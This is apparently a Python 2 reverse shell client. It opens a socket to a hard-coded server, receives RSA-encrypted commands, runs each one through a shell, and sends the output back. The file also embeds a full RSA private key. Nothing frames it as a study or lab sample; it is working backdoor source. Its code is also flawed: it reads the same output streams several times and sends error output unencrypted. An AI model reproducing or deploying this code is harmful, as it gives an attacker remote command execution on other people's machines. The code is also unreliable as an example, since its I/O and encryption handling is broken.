import socket
from subprocess import PIPE, Popen
from Crypto.PublicKey import RSA

SERVER_IP = '127.0.0.1'
SERVER_PORT = 8080

def encrypt(message):
    publickey = '''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAzSX0h4FbG2fQTSnNcNk6
GWjvUZxf/hS4RsBS8G2xMYYCnm/WV3pF9ADZoPholzqoGE+yPXmeniMye+nmi7a0
5idbUFlPIs2ZoegHmwDEjRyIuGP2lI2LxKGBbNZScW2nsujKbYm5dCCqTBBR3Lz5
sa80zjnOd7uji46mGe0tibqPr1wNQgIOjvQqxiCpbMnglDt99xdLB3XDOZD4PaLN
PP8bZ2ASTtOJnVMjBiusdCsjvvKp35OC/TSOoydP0m8qg8TzjJiiE+rlyF9ojTM4
WMTDR7twO0zmaTyY6sus+zBLkEK9Df1p3/hQegAxUd8YPNzFIfvNKhcSGZwedkMC
kJgCdxoT2c41b5gIUc7VNFSAts7QpdbwIZuEqUDru0Xova0lf64BLfW5dpGqMBAU
MU+fW1RT6eboiVPT5tkWSTyfLYaNhPKrYPubc6mF/eWrKSlLZ6i/3m0sJut3mvdd
1Kc0CNiAmWMn+Rx1uhfL9jXCgddcsTZjozZowRqtf3wMlRbv/d3dQEYTwhl3GD7G
AFG37upn9Q1PTiOHEUYH8eZoom/7OMPCIBlYnC+ymvLlUejPRx4Q5sLqeRIdQXg9
CBdd+KwIj8zzRiKBa7Own4vpFjVgecwO/g8sLibwSy6/kkaUtE4rqgbr3yENEjSe
mYT3swAkDvwSuQl4IPRGrwkCAwEAAQ==
-----END PUBLIC KEY-----
'''
    encryptor = RSA.importKey(publickey)
    global encryptedData 
    encryptedData = encryptor.encrypt(message, 0)
    return encryptedData[0]

def decrypt(cipher):
    privatekey = '''-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
'''
    decryptor = RSA.importKey(privatekey)
    dec = decryptor.decrypt(cipher)
    return dec

def chunked(s, data):
    for i in range(0, len(data), 512):
        chunk = data[0+i:512+i]
        print chunk
        s.send(encrypt(chunk))

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, SERVER_PORT))
    while True:
        command = decrypt(s.recv(512))
        if 'terminate' in command:
            s.close()
            break
        else:
            print command
            CMD = Popen(command, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
            if len(CMD.stdout.read()) > 512:
                chunked(s, CMD.stdout.read())
            else:
                s.send(encrypt(CMD.stdout.read()))
            if len(CMD.stderr.read()) > 512:
                chunked(s, CMD.stderr.read())
            else:
                s.send(CMD.stderr.read())

def main():
    connect()

main()
